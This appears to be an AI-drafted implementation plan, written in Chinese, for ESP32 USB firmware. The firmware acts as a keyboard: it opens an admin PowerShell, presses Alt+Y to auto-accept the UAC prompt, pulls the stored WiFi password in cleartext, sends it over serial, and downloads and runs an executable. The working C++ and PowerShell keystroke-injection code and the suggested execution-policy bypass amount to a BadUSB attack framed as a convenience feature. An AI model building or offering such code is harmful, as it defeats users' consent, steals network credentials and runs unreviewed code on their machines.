<!-- f8ea7183-9197-470f-b937-2056efaebda6 72d9693e-70b2-4519-a999-13b4d6b06dd2 -->
# 移除 USB MSD + WiFi 自动配置 + 网络下载代理程序

## 概述

将代理程序从 Flash FFat 分区转移到 LittleFS，通过 ESP32 Web 服务器提供下载。HID 自动获取主机 WiFi 信息（含 UAC 自动处理），ESP32 连接后下载并运行代理程序。

## 架构变更

### 当前架构

- USB 复合设备：HID + CDC + **MSD (U盘)**
- 代理程序存储：FFat 分区（有兼容性问题）
- WiFi 配置：手动或 Web 配网

### 新架构  

- USB 复合设备：**HID + CDC**（移除 MSD）
- 代理程序存储：**LittleFS** + Web 服务器下载
- WiFi 配置：**HID 自动获取 + UAC 自动处理**

## 实施步骤

### 1. 移除 USB MSD 相关代码

**修改文件：** `src/main.cpp`

移除以下内容：

```cpp
// 移除 FFat 初始化 (行 88-177)
// 移除 USBMSC 配置 (行 178-201)
#include <USBMSC.h>
#include <FFat.h>
USBMSC usb_msc_driver;
```

**修改：** `platformio.ini`

```ini
// 移除或注释
-DARDUINO_USB_MSC_ON_BOOT=1
-DARDUINO_USB_MSC_ENABLED=1
```

**移除分区表条目：** `boards/partitions_16MB_app_large.csv`

```csv
// 移除这一行
ffat,       data, fat,      0xA10000, 0x5F0000,
```

### 2. 代理程序迁移到 LittleFS

**创建目录结构：**

```
source_data/
  └── agent/
      ├── noox-host-agent.exe (Windows)
      ├── noox-host-agent-macos (macOS)
      └── noox-host-agent-linux (Linux)
```

**修改压缩脚本：** `compress_files_optimized.py`

- 添加代理文件复制逻辑（无需压缩）
- 将 agent/ 目录内容直接复制到 data_littlefs/

**调整 LittleFS 分区大小：** `boards/partitions_16MB_app_large.csv`

```csv
// 原: spiffs, data, spiffs, 0x810000, 0x200000,
// 改为 4MB 以容纳代理程序
spiffs,     data, spiffs,   0x810000, 0x400000,
```

### 3. Web 服务器添加代理下载接口

**修改文件：** `src/web_manager.cpp`

添加路由：

```cpp
server.on("/api/agent/download", HTTP_GET, [](AsyncWebServerRequest *request){
    String platform = request->getParam("platform")->value(); // windows/macos/linux
    String filename = "/agent/noox-host-agent";
    if (platform == "windows") filename += ".exe";
    else if (platform == "macos") filename += "-macos";
    else if (platform == "linux") filename += "-linux";
    
    if (LittleFS.exists(filename)) {
        request->send(LittleFS, filename, "application/octet-stream");
    } else {
        request->send(404, "text/plain", "Agent not found");
    }
});
```

### 4. HID 键入 PowerShell 脚本（获取 WiFi 并通过 CDC 发送）

**修改文件：** `src/hid_manager.cpp` 或 `include/hid_manager.h`

添加新方法：

```cpp
class HIDManager {
public:
    void autoGetWindowsWiFi(); // 新增：Windows 自动获取 WiFi
    void sendKey(uint8_t key, uint8_t modifier = 0);
    void typeString(const String& text);
};
```

**实现：** `src/hid_manager.cpp`

HID 键入 PowerShell 脚本，获取 WiFi 并通过 CDC 发送（简化版，纯文本格式）：

```cpp
void HIDManager::autoGetWindowsWiFi() {
    delay(2000); // 等待系统识别 USB 设备
    
    // 1. Win+R 打开运行
    sendKey(KEY_R, KEY_LEFT_GUI);
    delay(500);
    
    // 2. 输入 powershell 并以管理员身份运行
    typeString("powershell");
    delay(200);
    sendKey(KEY_RETURN, KEY_LEFT_CTRL | KEY_LEFT_SHIFT); // Ctrl+Shift+Enter
    
    // 3. 等待 UAC 弹窗并自动确认
    delay(1500);
    sendKey(KEY_Y, KEY_LEFT_ALT); // Alt+Y 确认
    delay(1000);
    
    // 4. 获取 WiFi SSID
    typeString("$wifi = (netsh wlan show interfaces | Select-String 'SSID' | Select-Object -First 1) -replace '.*: ', '';");
    sendKey(KEY_RETURN);
    delay(200);
    
    // 5. 获取 WiFi 密码
    typeString("$pass = (netsh wlan show profile name=$wifi key=clear | Select-String 'Key Content') -replace '.*: ', '';");
    sendKey(KEY_RETURN);
    delay(200);
    
    // 6. 找到 ESP32 CDC 串口
    typeString("$port = (Get-WmiObject Win32_SerialPort | Where-Object {$_.Description -like '*USB*'} | Select-Object -First 1).DeviceID;");
    sendKey(KEY_RETURN);
    delay(200);
    
    // 7. 发送 WiFi 信息到串口（简化格式：SSID|Password）
    typeString("if ($port) { $sp = New-Object System.IO.Ports.SerialPort $port, 115200; $sp.Open(); $sp.WriteLine(\"$wifi|$pass\"); $sp.Close(); }");
    sendKey(KEY_RETURN);
}
```

### 5. CDC 接收 WiFi 配置（简化版）

**修改文件：** `src/usb_shell_manager.cpp`

简单文本解析（格式：`SSID|Password`）：

```cpp
void UsbShellManager::loop() {
    if (USBSerial.available()) {
        String line = USBSerial.readStringUntil('\n');
        line.trim();
        
        // 解析格式：SSID|Password
        int separatorIndex = line.indexOf('|');
        if (separatorIndex > 0) {
            String ssid = line.substring(0, separatorIndex);
            String password = line.substring(separatorIndex + 1);
            
            Serial.printf("[CDC] Received WiFi: %s\n", ssid.c_str());
            
            // 连接并保存到 NVS
            if (wifiManager) {
                wifiManager->connectToWiFi(ssid, password, true);
            }
        }
    }
}
```

### 6. HID 自动下载并运行代理

**新增方法：** `src/hid_manager.cpp`

```cpp
void HIDManager::downloadAndRunAgent(const String& deviceIP) {
    // 1. 打开新的 PowerShell 窗口
    sendKey(KEY_R, KEY_LEFT_GUI);
    delay(500);
    typeString("powershell");
    sendKey(KEY_RETURN);
    delay(1000);
    
    // 2. 下载代理程序
    String downloadCmd = "Invoke-WebRequest -Uri 'http://" + deviceIP + "/api/agent/download?platform=windows' -OutFile $env:TEMP\\noox-agent.exe";
    typeString(downloadCmd);
    sendKey(KEY_RETURN);
    delay(3000); // 等待下载完成
    
    // 3. 运行代理程序（不再需要传入 WiFi 状态参数）
    typeString("& $env:TEMP\\noox-agent.exe");
    sendKey(KEY_RETURN);
}
```

### 7. 主流程集成

**修改：** `src/main.cpp` → `setup()`

```cpp
void setup() {
    // ... 初始化 LittleFS, HID, CDC, WiFi ...
    
    // 检查 WiFi 状态
    if (!wifiManager.isConnected()) {
        Serial.println("[BOOT] No saved WiFi, starting auto-config...");
        delay(3000);
        hidManager.autoGetWindowsWiFi(); // HID 获取 WiFi
        
        // 等待 WiFi 连接（超时 30 秒）
        int timeout = 30;
        while (!wifiManager.isConnected() && timeout-- > 0) {
            delay(1000);
        }
    }
    
    if (wifiManager.isConnected()) {
        Serial.println("[BOOT] WiFi connected, starting agent download...");
        delay(2000);
        String deviceIP = WiFi.localIP().toString();
        hidManager.downloadAndRunAgent(deviceIP);
    } else {
        Serial.println("[BOOT] WiFi auto-config failed, please configure manually");
    }
}
```

### 8. 更新部署脚本

**修改：** `deploy_all.py`

- 移除 FFat 镜像构建和上传步骤（步骤 5）
- 添加代理文件复制到 data_littlefs/agent/
- 更新 LittleFS 大小为 4MB

## 测试计划

1. **USB 识别测试**

   - 设备应显示为 HID + CDC（无 MSD）

2. **WiFi 自动配置测试**

   - 清除 NVS 中的 WiFi 配置
   - 插入设备，观察 HID 是否自动执行命令
   - 检查 UAC 是否自动点击
   - 验证 ESP32 是否成功连接 WiFi

3. **代理下载测试**

   - WiFi 连接后，验证 HID 是否自动下载代理
   - 检查下载的文件完整性
   - 验证代理程序是否自动运行

4. **CDC 通信测试**

   - 代理运行后，测试与 ESP32 的双向通信

## 风险与备用方案

**风险 1：UAC 延迟时间不准确**

- 备用方案：增加重试机制，多次发送 Alt+Y
- 或提供配置选项让用户调整延迟

**风险 2：PowerShell 执行策略限制**

- 备用方案：添加 `Set-ExecutionPolicy Bypass -Scope Process`

**风险 3：网络下载失败**

- 备用方案：重试 3 次，失败则显示手动下载提示

## 后续优化

1. 添加 macOS/Linux 支持（不同的 HID 命令序列）
2. 实现 AP 热点降级方案（如果自动配置失败）
3. 添加 Web 配网界面作为后备方案

### To-dos

- [ ] 移除 USB MSD 相关代码（main.cpp, platformio.ini, 分区表）
- [ ] 将代理程序迁移到 LittleFS，调整分区大小为 4MB
- [ ] Web 服务器添加代理程序下载接口 /api/agent/download
- [ ] 实现 HID 自动获取 Windows WiFi（含 UAC 自动处理）
- [ ] CDC 接收并解析 WiFi 信息，调用 WiFi Manager 连接
- [ ] HID 自动从 ESP32 下载并运行代理程序
- [ ] 主流程集成：启动时自动检测并执行配置流程
- [ ] 更新 deploy_all.py，移除 FFat 步骤，处理代理文件
- [ ] 完整测试：USB 识别、WiFi 自动配置、代理下载运行